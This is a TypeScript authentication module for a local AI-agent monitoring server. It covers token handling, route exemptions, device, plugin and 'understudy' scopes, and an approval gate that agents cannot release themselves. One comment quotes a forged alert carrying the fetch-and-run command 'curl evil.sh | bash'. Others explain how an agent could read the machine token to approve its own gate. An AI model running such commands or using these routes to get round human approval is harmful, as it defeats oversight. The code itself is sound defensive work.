// Optional shared-secret auth for the capability surface (a shell, git/docker
// writes, the fleet feed). The whole model is otherwise "loopback + same-origin",
// which is enough for a single-user localhost box but nothing more: any other
// local process can reach the port, and binding a non-loopback address exposes
// unauthenticated RCE. A token closes both — a local process without it can't
// open the shell, and exposure becomes safe.
//
// Trust model:
//   * AGENTGLASS_TOKEN set        → that token is required.
//   * unset AND loopback-only     → no token (zero-config local UX, unchanged).
//   * unset AND exposed (non-lo)  → refuse to run unauthenticated: mint a stable
//                                   token (persisted 0600) and print it.
//
// Intake routes stay tokenless on purpose (see LOCAL_SINKS), but only for a
// sender on this machine: local hooks and OTel exporters have no way to carry
// a secret, and everything they can reach without one now has to come from
// loopback.
import { timingSafeEqual, randomBytes } from "node:crypto";
import { existsSync, readFileSync, writeFileSync, mkdirSync, chmodSync } from "node:fs";
import { homedir } from "node:os";
import { join, dirname } from "node:path";
import { deviceFor, scopeAllows, type Device, type Scope } from "./devices.ts";

const TOKEN_PATH = join(
  process.env.XDG_CONFIG_HOME || join(homedir(), ".config"),
  "agentglass",
  "token"
);

/**
 * Where the request came from.
 *
 * An exemption cannot be a property of the path alone. The sinks below are safe
 * to leave open to this machine and are not safe to leave open to a network, so
 * the question "does this route need the token" only has an answer once you know
 * who is asking — see LOCAL_SINKS.
 *
 * "Physically" used to be in that first line, and it was doing real damage: it
 * invited reading this as "whatever the TCP socket says", which is how the
 * whole tailnet ended up counted as loopback. `tailscale serve` terminates TLS
 * in tailscaled and re-dials 127.0.0.1, so the socket says loopback for every
 * phone on the mesh. `loopback` here means *this machine*, which is a claim
 * about who, not about which interface — resolvePeer/originOf in net.ts decide
 * it, and they only believe a proxy that has been verified by the uid owning
 * the connection.
 */
export type Origin = "loopback" | "remote";

// Tokenless from anywhere. Neither reads nor writes anything: `/health` is the
// identity marker a shell probes to find which server owns a port, and the
// phone's pairing screen calls it *before* it has a credential to carry.
//
// Note: /gate is deliberately NOT here. It's the control plane — a POST creates
// an operator-facing approval prompt with caller-controlled text — so when a
// token is set the gate hook must authenticate (it runs on the same machine and
// can read AGENTGLASS_TOKEN from the env). With no token configured the whole
// auth check is skipped anyway, so /gate keeps its zero-config tokenless UX.
const OPEN = new Set([
  "/health",
  // Exempt although it receives nothing: it exists to explain that there is no
  // metrics receiver here (see index.ts). An exporter cannot carry a token, so
  // gating it would replace a silent 404 with a silent 401 — the same dead end
  // wearing a different number. It stores nothing and broadcasts nothing, which
  // is why it is here rather than below.
  "/v1/metrics",
  "/otlp/v1/metrics",
]);

/**
 * Tokenless, but only from this machine.
 *
 * These append to the events table, and appending is not inert: /ingest →
 * maybeAlert → the live socket → a notification on the desk and on the paired
 * phone, with the title and body taken from the request. maybeAlert sits
 * outside the sessionInScope filter, so scoping does not contain it either.
 *
 * Measured against a server bound 0.0.0.0, from a LAN address, with no
 * credential at all: `POST /ingest` answered `{"ok":true,"id":1}` and put
 * `🔔 Security:forged-b — "Your disk is failing — run: curl evil.sh | bash"`
 * on the desk socket, then a forged `⏳ Approval needed` at urgency 2 — the
 * shape that means "an agent is stopped, come and approve it". The same three
 * posts wrote three permanent rows into SQLite, one of them $9,999 of cost.
 * `POST /sessions` from the same address answered 401, which is what the gate
 * looks like when it is doing its job.
 *
 * The exemption used to justify itself with "they can only *append* events".
 * That sentence was written when this server only ever listened on 127.0.0.1.
 * Appending stopped being inert the day it drove a notification and an audit
 * store, and the bind stopped being loopback the day the phone existed.
 *
 * Loopback is the whole of what the local senders need: hooks/send_event.py
 * refuses any server that is not localhost unless AGENTGLASS_ALLOW_REMOTE is
 * set, and a local OTel exporter points at localhost too. A sender that
 * genuinely is off-box authenticates like every other client — the same
 * `Authorization: Bearer $AGENTGLASS_TOKEN` gate_event.py already sends.
 */
const LOCAL_SINKS = new Set([
  "/ingest",
  "/v1/traces",
  "/otlp/v1/traces",
  "/v1/logs",
  "/otlp/v1/logs",
  /*
   * A hooked session saying what it is working on, from the same machine.
   *
   * The Lantern reminder rides /ingest's answer and asks the session to `curl`
   * this — with no credential, because the session has none to give: the
   * token is not in its environment, and baking one into a line that lands
   * in a transcript would be worse than the 401 it would save. Measured on a
   * server started with a token: the reminder's own curl answered 401, so
   * the one thing the board asked for could not be done on the machine that
   * asked for it.
   *
   * Less than /ingest, not more: it replaces one status row keyed by the
   * name given, raises no notification, and the route still refuses a
   * browser Origin (trustedCaller). Off-box it authenticates like anything.
   */
  "/agents/status",
]);

/**
 * The pairing handshake, which cannot require the credential it hands out.
 *
 * Nothing under here is a way in on its own: the machine-side routes refuse
 * anything but loopback, and the phone-side ones are worth exactly as much as
 * the ticket and code the person is holding — see pairing.ts. Prefixed rather
 * than listed because the set is a protocol, and a step added to the protocol
 * without its exemption fails in a way that looks like a bug in the phone.
 */
export const isPairing = (pathname: string) => pathname === "/pair" || pathname.startsWith("/pair/");

/**
 * True for routes that bypass the shared-secret gate even when a token is set.
 *
 * `from` is not optional on purpose. A default would decide the loopback
 * question for a call site that forgot to ask it, and the direction a forgotten
 * default falls is straight through the gate — so the compiler asks instead.
 */
export const isAuthExempt = (pathname: string, from: Origin) =>
  isPairing(pathname) || OPEN.has(pathname) || (from === "loopback" && LOCAL_SINKS.has(pathname));

// Rate-limited intake sinks (flood protection). /gate is included: even though
// it authenticates when a token is set, a burst of gate posts shouldn't be
// unbounded. This set governs throttling only, not auth exemption — which is
// why it names the sinks whatever address they arrive from: a flood is a flood.
// `/pair/claim` is here for the same reason: it takes no credential, so the
// only thing standing between it and a script is the five-guess cap on one
// ticket. That cap is the real defence; this stops the noise before it.
const INTAKE = new Set([...OPEN, ...LOCAL_SINKS, "/gate", "/pair/claim"]);

export const isIntake = (pathname: string) => INTAKE.has(pathname);

export interface Auth {
  token: string | null;
  source: "env" | "file" | "generated" | "none";
  path: string;
}

/**
 * …and the one thing to know before reading any credential rule below: on a
 * loopback-only install with no `AGENTGLASS_TOKEN`, this returns `null` and
 * index.ts skips the whole block that calls `callerFor` and `allowed`. Nothing
 * downstream ever learns WHO is asking, so every rule graded by scope — the
 * `answer` grant, `answersFromADevice`, the deny-by-default table — is not
 * loosened on such a box, it is simply never consulted.
 *
 * Which installs those are: `bun run dev` and any hand-started server. NOT the
 * packaged desktop app, which mints a secret on first launch and hands it to
 * its own sidecar (electron/main.js), so it is authenticated on loopback like
 * everything else. If you are running the server yourself and want any of this
 * enforced, set `AGENTGLASS_TOKEN`.
 */
export function resolveToken(loopbackOnly: boolean): Auth {
  const fromEnv = process.env.AGENTGLASS_TOKEN?.trim();
  if (fromEnv) return { token: fromEnv, source: "env", path: TOKEN_PATH };
  if (loopbackOnly) return { token: null, source: "none", path: TOKEN_PATH };
  const existing = readPersisted();
  if (existing) return { token: existing, source: "file", path: TOKEN_PATH };
  const t = randomBytes(24).toString("base64url");
  persist(t);
  return { token: t, source: "generated", path: TOKEN_PATH };
}

function readPersisted(): string | null {
  try {
    return existsSync(TOKEN_PATH) ? readFileSync(TOKEN_PATH, "utf8").trim() || null : null;
  } catch {
    return null;
  }
}

function persist(t: string): void {
  try {
    mkdirSync(dirname(TOKEN_PATH), { recursive: true });
    writeFileSync(TOKEN_PATH, t + "\n", { mode: 0o600 });
    chmodSync(TOKEN_PATH, 0o600); // enforce even if the file pre-existed with looser perms
  } catch {
    /* best effort — the token still works for this run */
  }
}

function eq(a: string, b: string): boolean {
  const ba = Buffer.from(a);
  const bb = Buffer.from(b);
  if (ba.length !== bb.length) return false; // length is not secret
  return timingSafeEqual(ba, bb);
}

/** True when the request carries the token — `Authorization: Bearer <t>` for
 *  fetch, or `?token=<t>` for the URLs a browser can't attach a header to
 *  (WebSocket upgrades, download navigations). */
export function tokenOk(req: Request, url: URL, token: string): boolean {
  const provided = presented(req, url);
  return !!provided && eq(provided, token);
}

/** The credential this request carries, however it carried it. */
function presented(req: Request, url: URL): string {
  const auth = req.headers.get("authorization") || "";
  const bearer = auth.startsWith("Bearer ") ? auth.slice(7).trim() : "";
  return bearer || url.searchParams.get("token") || "";
}

/**
 * Who is asking, and how much they are allowed to do.
 *
 * Two kinds of credential reach this server now. The machine's own token is
 * what the desk uses and what a hook carries; it is the whole machine, so it
 * is `full`. A **device** credential belongs to one paired phone, was minted
 * with a scope somebody chose while looking at the request, and can be taken
 * back without touching anything else — see devices.ts.
 *
 * Order matters: the machine token is checked first and in constant time, so
 * the common case never walks the device list at all.
 */
export interface Caller {
  /**
   * Three kinds, and the third is not a flavour of the second.
   *
   * A plugin's token used to come back as `device`, on the reasoning that a
   * scoped grant a human approved means the same thing whichever way it was
   * minted. For `allowed` that is true. For `answersFromADevice` it is false,
   * and the gap was measured: a manifest may declare `scope: "answer"` or
   * `"full"`, and with `kind: "device"` that plugin passed
   * `answersFromADevice` and could POST `/gate/decide` — the one act this file
   * says only "a credential an agent on this machine cannot mint" may perform.
   * A plugin IS a process on this machine, started by this server, holding a
   * token this server handed it. It is exactly the thing the gate is asking
   * about, so it gets its own kind and the gate turns it away by name.
   */
  kind: "machine" | "device" | "plugin";
  scope: Scope;
  device?: Device;
  /**
   * A narrowing that no scope can undo.
   *
   * The understudy watches the work and keeps score; it never acts. The obvious
   * way to say that would be a fourth `Scope` sitting under `read`, and it is
   * the wrong one. RANK in devices.ts is a *total order* and every check asks
   * "is this at least X", so a new value has to be placed somewhere on that
   * line — and anything placed above `read` inherits ANSWER_POST, which
   * contains `/chat/send`: the single route the understudy must never hold,
   * because holding it means speaking as him into a running agent. Placing it
   * below `read` fails the other way round: it could not GET anything, and
   * looking is the entire job.
   *
   * So the understudy is not a scope at all. It is a principal, and `allowed`
   * answers for it with its own total function, before scope is consulted at
   * all. Whatever scope the credential happens to carry is then irrelevant,
   * which is the property worth having: no future widening of `full`, and no
   * slip while minting, can hand this caller a write nobody wrote down here.
   *
   * Nothing mints such a caller yet — v1 has no understudy credential — so this
   * is the fence going up before the thing that needs fencing arrives, which is
   * the only order in which a fence is ever built correctly.
   */
  principal?: "understudy";
  /** The plugin's name when `kind` is `plugin`. `allowed` grades it by scope
   *  like any other caller — the manifest declared a scope and a human approved
   *  it — but it is never a person's hand on a gate; see `kind`. */
  plugin?: string;
}

/*
 * Credentials carrying the understudy's principal, and why they had to exist.
 *
 * `understudyAllows` has fenced this principal since it was written, and until
 * now NOTHING COULD PRESENT IT: `callerFor` returned a machine or a device and
 * nothing else, so the fence guarded a caller with no way to arrive. Correct,
 * and unreachable.
 *
 * That stopped being harmless the moment the work loop began launching agents.
 * They inherit the process environment, which carries the MACHINE token — so an
 * agent asking this server anything asked as the machine, `full` scope, every
 * write route open. The thing being fenced was holding the key to the fence.
 *
 * One minted credential fixes both halves. The agent can read every view this
 * app has — which is the ask, "give it the views too" — and can write nothing,
 * because `understudyAllows` refuses every POST outside a short enumerated set.
 *
 * IN MEMORY AND PER RUN. Never written to disk, revoked when the run ends, gone
 * entirely on restart. A credential that outlives the work it was minted for is
 * a credential somebody finds later.
 */
const understudyTokens = new Set<string>();

export function mintUnderstudyToken(): string {
  const t = `us_${randomBytes(24).toString("base64url")}`;
  understudyTokens.add(t);
  return t;
}

export function revokeUnderstudyToken(t: string): void {
  understudyTokens.delete(t);
}

/** How many are live, so a test can prove they do not accumulate. */
export function understudyTokenCount(): number {
  return understudyTokens.size;
}

/**
 * Credentials minted for an enabled plugin, one per running instance.
 *
 * IN MEMORY ONLY, same reasoning as `understudyTokens`: this is not the
 * plugin's identity (that is its name, recorded in plugins.json), it is a
 * live grant that must not survive past the process it was minted for. A
 * restart means every plugin gets a fresh token when it is respawned, not
 * that yesterday's token still opens the door.
 */
const pluginTokens = new Map<string, { scope: Scope; name: string }>();

export function mintPluginToken(scope: Scope, name: string): string {
  const t = `pg_${randomBytes(24).toString("base64url")}`;
  pluginTokens.set(t, { scope, name });
  return t;
}

export function revokePluginToken(t: string): void {
  pluginTokens.delete(t);
}

/** So a test can prove a disabled plugin's token stops working, not merely
 *  that the process was asked to exit. */
export function pluginTokenCount(): number {
  return pluginTokens.size;
}

export function callerFor(req: Request, url: URL, token: string): Caller | null {
  const provided = presented(req, url);
  if (!provided) return null;
  /*
   * Checked BEFORE the machine token, and it cannot collide: these carry a
   * prefix the machine token never has. Checking after would be equally correct
   * today and would quietly become wrong the first time somebody changed how
   * either one is made.
   */
  if (understudyTokens.has(provided)) {
    return { kind: "machine", scope: "full", principal: "understudy" };
  }
  const plugin = pluginTokens.get(provided);
  if (plugin) return { kind: "plugin", scope: plugin.scope, plugin: plugin.name };
  if (eq(provided, token)) return { kind: "machine", scope: "full" };
  const device = deviceFor(provided);
  return device ? { kind: "device", scope: device.scope, device } : null;
}

/**
 * A phone may answer what is already asked. It may not drive the machine.
 *
 * Written as *deny by default* on purpose: anything that changes state and is
 * not named below needs `full`, so a route added next month is out of a paired
 * phone's reach until somebody decides otherwise. The reverse default — a list
 * of forbidden routes — fails open every time the list is not updated, and the
 * thing it fails open on is a shell.
 *
 * That leaves two sets of exceptions, both of which exist because this server's
 * verbs do not line up neatly with HTTP's:
 */

/** POSTs that only read. They are POSTs because their argument is a filesystem
 *  path, which has no business in a URL, not because they change anything. */
const READ_POST = new Set(["/git/status"]);

/**
 * GETs that are not reads. `/terminal/pty` is a WebSocket upgrade, and a
 * browser cannot put a header on one — so it arrives as a GET carrying
 * `?token=`, and a rule that trusted the method would hand a read-only device
 * an interactive root shell. This set is the reason `scopeNeeded` cannot be
 * one line.
 */
const FULL_GET = new Set([
  "/terminal/pty",
  // Imported browsing history. It is a GET, so the method default would hand it
  // to a read-scope phone — but it is the same private data cookieread keeps off
  // HTTP on purpose, not something a paired read-only device should be able to
  // pull. Drive verbs (/browser/open, /browser/read) already need full as POSTs;
  // this brings the history read in line with them.
  "/browser/places/all",
]);

/**
 * What a phone is for.
 *
 * `/gate/decide` is the reason a phone exists at all: an agent is stopped and a
 * person says go. The chat routes are the same act by other means — replying to
 * a session that is already running, which is what "answer" means. Starting new
 * sessions, the terminal, git write and docker are not here.
 *
 * `/push/subscribe`, `/push/unsubscribe` and `/push/test` were also here, for a
 * device managing its own notifications. Web Push is gone — a phone now hears
 * alerts on the live socket it already holds, which needs no write at all — and
 * a name left in this set after its route is deleted is worse than dead code:
 * this is the file that decides what a paired phone may do, and the next route
 * to be called `/push/test` would inherit an `answer` grant nobody chose for it.
 */
const ANSWER_POST = new Set([
  "/gate/decide",
  "/chat/send",
  "/chat/pane/key",
]);

export function scopeNeeded(method: string, pathname: string): Scope {
  if (FULL_GET.has(pathname)) return "full";
  if (method === "GET" || method === "HEAD") return "read";
  if (READ_POST.has(pathname)) return "read";
  if (ANSWER_POST.has(pathname)) return "answer";
  return "full";
}

/**
 * Every write the understudy has, which in v1 is its own two switches.
 *
 * A *positive* allowlist, and deliberately tiny. The question this set answers
 * is not "which routes should the understudy be kept away from" — that question
 * has no end, and a list of forbidden things fails open on every route added
 * after it was written. The question is "what does something that only watches
 * actually need to POST", and the honest answer is: nothing it does not own.
 * It records what he did and what it would have predicted; it opens no session,
 * sends no key, runs no git, touches no card.
 *
 * Both routes below exist to make it do *less*. `/understudy/mode` moves one
 * class between shadow and off, `/understudy/halt` stops the whole thing. So
 * the worst an understudy credential in the wrong hands can do with either is
 * turn the scoreboard off, which is a property worth keeping when the next
 * route is proposed.
 *
 * `/chat/send` and `/terminal/tmux/windows` are the two names that are
 * deliberately *not* here, and understudy-allowlist.test.ts asserts both by
 * name rather than by rule. The first is speaking as him into a running agent;
 * the second reshapes his desk out from under him. Something that can do either
 * has stopped being a watcher, so on the day somebody adds "just let it reply",
 * the failing test is the conversation that should happen first.
 */
export const UNDERSTUDY_POST = new Set([
  "/understudy/mode",
  "/understudy/halt",
]);

/**
 * What the understudy may ask for, decided without ever consulting a scope.
 *
 * Total on purpose: any method that is neither a read nor a named POST is
 * false, so a route invented next month is out of reach before anybody thinks
 * about it — the same deny-by-default `scopeNeeded` uses. The difference, and
 * the reason this is a separate function rather than a rank, is that this one
 * cannot be widened by granting anything, because it never asks what was
 * granted.
 *
 * Reads are allowed wholesale minus FULL_GET, which is the identical carve-out
 * the device rules make and for the identical reason: `/terminal/pty` is a
 * WebSocket upgrade wearing a GET, and an interactive shell handed to the one
 * caller whose entire promise is that it does not act would make the promise a
 * lie. `/git/status` arrives through READ_POST — a read that had to be a POST
 * because its argument is a filesystem path — and the understudy needs it to
 * see which branch a piece of work started on.
 */
export function understudyAllows(method: string, pathname: string): boolean {
  if (method === "GET" || method === "HEAD") return !FULL_GET.has(pathname);
  if (method === "POST") return READ_POST.has(pathname) || UNDERSTUDY_POST.has(pathname);
  return false;
}

/** What index.ts answers with when the understudy is switched on and there is
 *  no token to enforce it with. Shared so the route and the test agree on the
 *  wording, and so the person reading the 409 is told the fix. */
export const UNDERSTUDY_NO_TOKEN_ERROR =
  "the clone cannot be enabled on a server with no auth token: its limits are enforced per-caller, " +
  "and an unauthenticated server never identifies a caller — set AGENTGLASS_TOKEN and restart";

/**
 * Whether this install still owes a token, and therefore whether everything
 * above is load-bearing or decoration.
 *
 * This is the single most dangerous property of the design, so it is written
 * down here rather than left to be found. `resolveToken` returns a null token
 * on the zero-config loopback path — `bun run dev` and any hand-started server
 * — and index.ts guards the whole `callerFor` / `allowed` block behind having
 * one. No token means nothing downstream ever learns *who* is asking, which
 * means `understudyAllows` never runs, which means the understudy is not
 * narrowed on such a box: it is simply absent, and every request arrives as an
 * unidentified local caller with the run of the server, `/chat/send` included.
 * The allowlist would sit in this file looking exactly as correct as it does
 * now and hold nothing at all.
 *
 * A fence cannot fix that from inside itself, so the refusal happens one level
 * up, at the moment somebody turns the understudy on: index.ts calls this
 * first and answers 409 with UNDERSTUDY_NO_TOKEN_ERROR — a conflict with the
 * state of the install, not a malformed request and not a missing credential.
 * Setting `AGENTGLASS_TOKEN`, or running the packaged desktop app which mints
 * one for its own sidecar, is the whole of the fix.
 *
 * `true` means *there is no token, refuse*. The direction is spelled out
 * because the misreading this invites is "does the understudy require a token —
 * yes, obviously", and the install where that misreading changes the answer is
 * precisely the unauthenticated one.
 */
export function understudyRequiresToken(token: string | null | undefined): boolean {
  return !token;
}

/** True when this caller may make this request. */
export function allowed(caller: Caller, method: string, pathname: string): boolean {
  // First, and returning outright — see `principal` on Caller. The understudy's
  // fence is a different function, not a lower rank, and the two must never be
  // consulted together: an `||` on this line would give back everything the
  // separate function exists to take away.
  if (caller.principal === "understudy") return understudyAllows(method, pathname);
  return scopeAllows(caller.scope, scopeNeeded(method, pathname));
}

/**
 * A caller holding a credential an agent on this machine cannot mint.
 *
 * `scopeNeeded` answers "is this caller allowed to answer a gate", and for the
 * machine token the answer is yes — `full` contains `answer`, and it has to,
 * because the desk is the machine. That is the right answer to that question
 * and the wrong one to a different question that `/gate/decide` has to ask:
 * *is the thing pressing the button the same thing being held?*
 *
 * The held party is an agent running as this user. It reads
 * `~/.config/agentglass/token` — 0600 is not a wall against a process that is
 * already you — or finds `AGENTGLASS_TOKEN` in its own environment, because a
 * hook it launched needs it there. So the machine token proves the request came
 * from this machine and proves nothing at all about who on it.
 *
 * A device credential is a different fact. It was minted at the desk while
 * somebody looked at the request (pairing.ts), it is stored here only as a
 * hash, it never touches the environment an agent inherits, and it can be taken
 * back on its own. `answer` is the grant that exists for exactly this act — see
 * ANSWER_POST above — so `full` clears it too, on the same widest-first rule
 * every other check uses.
 *
 * A plugin's credential is the machine's problem wearing a scope. It is minted
 * by this server (mintPluginToken), handed to a child process of this server,
 * and sits in that process's environment — the same place an agent's hook finds
 * the machine token. Whatever scope its manifest declared, it fails the question
 * this function asks, so it is refused here whatever `allowed` said.
 *
 * Note what this cannot tell you when no token is configured at all: `caller`
 * is then always null (see resolveToken), so this returns false and the origin
 * half of the check in index.ts is the whole of it.
 */
export function answersFromADevice(caller: Caller | null | undefined): boolean {
  // The understudy is excluded here as well as in `allowed`, and the repetition
  // is the point. `allowed` already refuses it `/gate/decide`, so this line
  // changes no outcome today — it exists because this function is a *second*
  // door onto the same act (mayReleaseAHold in index.ts asks it directly), and
  // a caller that must never press the button should be turned away at both.
  // The day someone gives the understudy an `answer`-scoped credential for some
  // unrelated convenience, this is what stops it releasing its own holds.
  if (caller?.principal === "understudy") return false;
  // A plugin is spelled out too, although `kind === "device"` below already
  // excludes it, for the same reason the understudy is: this is the door, and
  // the caller that was walking through it until the kind existed (see
  // `Caller.kind`) should be refused by name here, not by the shape of an
  // equality that somebody may one day loosen to "any credential that is not
  // the machine's".
  if (caller?.kind === "plugin") return false;
  return caller?.kind === "device" && scopeAllows(caller.scope, "answer");
}
